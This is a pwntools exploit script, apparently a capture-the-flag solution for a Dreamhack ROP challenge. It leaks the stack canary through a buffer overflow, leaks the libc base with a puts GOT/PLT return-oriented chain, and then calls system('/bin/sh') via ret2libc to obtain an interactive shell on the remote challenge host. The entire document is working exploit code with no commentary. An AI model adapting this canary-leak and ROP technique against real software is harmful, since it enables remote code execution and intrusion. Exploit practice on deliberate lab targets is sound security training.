from pwn import*

p = remote('host3.dreamhack.games', 11840)
#p = process('./rop_patched')
#gdb.attach(p,api=True)

#######################
# STEP_1: Leak_canary #
#######################

payload = b"a"*0x38
p.sendline(payload)

p.recvuntil(payload)
canary = (int.from_bytes(p.recv(8), "little")>>2*4)<<2*4
print('[+]Canary:',hex(canary))

##########################
# STEP_2: Leak_libc_base #
##########################

puts_plt = 0x0000000000400570
puts_got = 0x601018
rdi_ret = 0x00000000004007f3
ret = 0x000000000040055e
main = 0x00000000004006a7

payload = b"a"*0x38 + p64(canary) + b"a"*8 + p64(rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main)
p.sendline(payload)

p.recvuntil(b"Buf: ")
libc_base = int.from_bytes(p.recv(6), "little") - 0x80aa0
print('[+]Libc_base:',hex(libc_base))

####################
# STEP_4: ret2libc #
####################

system = libc_base + 0x000000000004f550
binsh = libc_base + 0x1b3e1a

payload = b"a"
p.sendline(payload)

payload = b"a"*0x38 + p64(canary) + b"a"*8 + p64(ret) + p64(rdi_ret) + p64(binsh) + p64(system)
p.sendline(payload)
p.interactive()

